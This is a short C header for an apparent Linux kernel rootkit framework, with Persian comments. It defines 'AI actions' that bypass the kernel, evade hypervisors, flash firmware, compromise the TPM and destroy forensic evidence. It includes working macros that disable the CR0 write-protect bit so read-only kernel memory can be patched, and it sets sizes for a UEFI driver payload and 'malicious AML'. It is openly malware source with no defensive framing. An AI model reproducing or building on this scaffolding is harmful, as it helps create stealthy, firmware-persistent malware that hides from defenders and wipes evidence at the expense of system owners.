#ifndef OMNI_DEFS_H
#define OMNI_DEFS_H

#include <linux/types.h>
#include <linux/io.h>

// دسته‌بندی اقدامات هوش مصنوعی
enum ai_actions {
    AI_NO_ACTION,
    AI_BYPASS_KERNEL,
    AI_EVADE_HYPERVISOR,
    AI_FLASH_FIRMWARE,
    AI_COMPROMISE_TPM,
    AI_DESTRUCT_EVIDENCE,
    AI_ADAPTIVE_LEARNING
};

// ساختار وضعیت سیستم
struct system_state {
    u8 security_level;
    u8 virtualization_status;
    u8 firmware_type;
    u8 tpm_present;
    u8 forensic_indicators;
    u32 kernel_version;
    u64 threat_score;
};

// ماکروهای دسترسی پیشرفته
#define disable_wp() ({ \
    unsigned long cr0 = read_cr0(); \
    write_cr0(cr0 & ~X86_CR0_WP); \
})

#define enable_wp() ({ \
    unsigned long cr0 = read_cr0(); \
    write_cr0(cr0 | X86_CR0_WP); \
})

// اندازه‌های پیلود
#define UEFI_DRIVER_SIZE 8192
#define MALICIOUS_AML_SIZE 2048
#define AI_MODEL_SIZE 5242880

#endif // OMNI_DEFS_H
